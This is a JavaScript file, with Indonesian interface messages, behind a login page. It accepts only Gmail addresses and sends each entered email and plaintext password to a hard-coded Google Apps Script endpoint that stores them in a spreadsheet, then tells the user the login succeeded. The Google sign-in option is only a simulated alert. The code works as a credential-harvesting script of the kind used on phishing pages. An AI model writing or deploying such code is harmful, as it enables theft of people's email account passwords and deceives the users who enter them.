const scriptURL = 'https://script.google.com/macros/s/AKfycbw3wTOPR4co3jbiGWsaOIG15b3owEwkP4WsrMWqmSXRUUtHyzJSlNpBt5LE8IL9G9d12A/exec';
const loginForm = document.getElementById('loginForm');
const submitButton = document.querySelector('.btn-primary');

loginForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;

    if (!email.endsWith('@gmail.com')) {
        alert('Harap gunakan email Gmail.');
        return;
    }

    submitButton.disabled = true;
    submitButton.textContent = 'Mengirim...';

    try {
        await saveToSpreadsheet(email, password);
        alert('Login berhasil! Data telah disimpan.');
        loginForm.reset();
    } catch (error) {
        alert('Gagal mengirim data: ' + error.message);
        console.error(error);
    } finally {
        submitButton.disabled = false;
        submitButton.textContent = 'Masuk';
    }
});

function loginWithGoogle() {
    alert('Fitur login Google masih dalam versi simulasi. Gunakan login manual sementara.');
}

async function saveToSpreadsheet(email, password) {
    const response = await fetch(scriptURL, {
        method: 'POST',
        headers: { 
            'Content-Type': 'text/plain;charset=utf-8'   // ← Ini kuncinya!
        },
        body: JSON.stringify({ email, password })
    });

    if (!response.ok) {
        throw new Error('HTTP ' + response.status);
    }

    const result = await response.json();
    return result;
}
    
